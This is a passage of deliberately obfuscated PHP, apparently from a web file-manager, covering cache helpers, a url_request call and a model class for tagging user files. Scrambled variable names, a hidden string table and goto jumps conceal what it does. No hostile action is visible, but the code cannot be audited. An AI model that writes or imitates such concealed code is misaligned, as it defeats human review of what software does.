$aœñ·â¼·ó[303]: $Cî…ÀÙ‚ = url_request($eÁÂ›«Õ³‡[$aœñ·â¼·ó[1493]], $aœñ·â¼·ó[226], !1, !1, !1, !1, 5); $dÎóÒÖâ = strlen($Cî…ÀÙ‚); break; case $aœñ·â¼·ó[225]: $dÎóÒÖâ = Hook::apply($eÁÂ›«Õ³‡[$aœñ·â¼·ó[1493]]); default: break; } goto dÅÒÎÌŒæ„; cÇ›óŞŠ¾“: } private static function valueGet($DÊ†å»ÃµÆ) { $Eæ»·½†Æ =& $_SERVER[òÀöí]; $d•§øíåàä = $Eæ»·½†Æ[1502]; $AØÇ¢»“Ÿ = Model($Eæ»·½†Æ[1503])->get($DÊ†å»ÃµÆ, $d•§øíåàä); if (is_null($AØÇ¢»“Ÿ)) { Model($Eæ»·½†Æ[1503])->set($Eæ»·½†Æ[1472], 10, $d•§øíåàä); Model($Eæ»·½†Æ[1503])->set($Eæ»·½†Æ[708], $Eæ»·½†Æ[86], $d•§øíåàä); Model($Eæ»·½†Æ[1503])->set($Eæ»·½†Æ[1467], $Eæ»·½†Æ[486], $d•§øíåàä); $AØÇ¢»“Ÿ = Model($Eæ»·½†Æ[1503])->get($DÊ†å»ÃµÆ, $d•§øíåàä); } return $AØÇ¢»“Ÿ; } private static function valueSet($CÎ½ÃôÌ’‰, $c¾‰÷¾Î) { $DÜ±Äƒœî =& $_SERVER[òÀöí]; return Model($DÜ±Äƒœî[1503])->set($CÎ½ÃôÌ’‰, $c¾‰÷¾Î, $DÜ±Äƒœî[1502]); } protected static function log($a•ê·ØÍ¾) { write_log($a•ê·ØÍ¾, $_SERVER[òÀöí][1489]); } private static function cacheClear() { $c¼Œˆ©¡„™ =& $_SERVER[òÀöí]; $CêŸëïœ¶ = Model($c¼Œˆ©¡„™[1503])->cacheKey($c¼Œˆ©¡„™[1502]); Cache::clearMemory($CêŸëïœ¶); Model($c¼Œˆ©¡„™[1474])->cacheClear(); } } goto F©‰‚ÇÊîÄ; D‰µ×¨–‡ï: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($dŒâæ÷òÛæ) { $F–õåˆÙô® =& $_SERVER[òÀöí]; return array($F–õåˆÙô®[1763] => array(USER_ID, $F–õåˆÙô®[1764])); } protected function listData() { $DÛ³•Ü©  =& $_SERVER[òÀöí]; $BŸ‚¦Ú—Š¯ = array($DÛ³•Ü© [1496] => USER_ID, $DÛ³•Ü© [452] => array($DÛ³•Ü© [1767], 0)); $f«º½¼ší¬ = $DÛ³•Ü© [1769]; $CµŒÒÅ¤© = $this->field($f«º½¼ší¬)->where($BŸ‚¦Ú—Š¯)->order($DÛ³•Ü© [1770])->select(); return $CµŒÒÅ¤© ? $CµŒÒÅ¤© : array(); } protected function listByTag($EË²Ô×´¶—) { } protected function addToTag($E„ÑÁšš†, $CÛ»’òÕé) { $C˜ùŸÏèŒ‹ =& $_SERVER[òÀöí]; if (!Model($C˜ùŸÏèŒ‹[1907])->listData($CÛ»’òÕé) || !Model($C˜ùŸÏèŒ‹[778])->pathInfo($E„ÑÁšš†)) { return !1; } $eĞ ‡ä­¶ = array($C˜ùŸÏèŒ‹[1496] => USER_ID, $C˜ùŸÏèŒ‹[452] => $CÛ»’òÕé, $C˜ùŸÏèŒ‹[405] => $E„ÑÁšš†, $C˜ùŸÏèŒ‹[406] => $C˜ùŸÏèŒ‹[400], $C˜ùŸÏèŒ‹[404] => $C˜ùŸÏèŒ‹[33], $C˜ùŸÏèŒ‹[1667] => 0); if ($this->where($eĞ ‡ä­¶)->find()) { return !1; } return $this->add($eĞ ‡ä­¶); } protected function removeFromTag($dƒÉíîÁÃ, $c¸øÌÈ¢º) { $b¦—¯¸îÌ =& $_SERVER[òÀöí]; if (!Model($b¦—¯¸îÌ[1907])->listData($c¸øÌÈ¢º)) { return !1; } if (is_array($dƒÉíîÁÃ)) { $dƒÉíîÁÃ = array($b¦—¯¸îÌ[7], $dƒÉíîÁÃ); } $e®ÀöÓ¿ŒÒ = array($b¦—¯¸îÌ[1496] => USER_ID, $b¦—¯¸îÌ[452] => $c¸øÌÈ¢º, $b¦—¯¸îÌ[406] => $b¦—¯¸îÌ[400], $b¦—¯¸îÌ[405] => $dƒÉíîÁÃ); return $this->where($e®ÀöÓ¿ŒÒ)->delete(); } protected function removeByTag($d¡êÁÌŒ) { $A…ç¡¿µ—‚ =& $_SERVER[òÀöí]; if (!$d¡êÁÌŒ) { return !1; } $FÖ–¬„È = array($A…ç¡¿µ—‚[1496] => USER_ID, $A…ç¡¿µ—‚[452] => $d¡êÁÌŒ); return $this->where($FÖ–¬„È)->delete(); } protected function removeBySource($dÈ­Â¶ÅÈ) { $Fµ¯¡Ëì†¹ =& $_SERVER[òÀöí]; if (is_array($dÈ­Â¶ÅÈ)) { $dÈ­Â¶ÅÈ = array($Fµ¯¡Ëì†¹[7], $dÈ­Â¶ÅÈ); } $e³§Œ‘÷Í‹ = array($Fµ¯¡Ëì†¹[1496] => USER_ID, $Fµ¯¡Ëì†¹[405] => $dÈ­Â¶ÅÈ, $Fµ¯¡Ëì†¹[452] => array($Fµ¯¡Ëì†¹[950], 0)); return $this->where($e³§Œ‘÷Í‹)->delete(); } }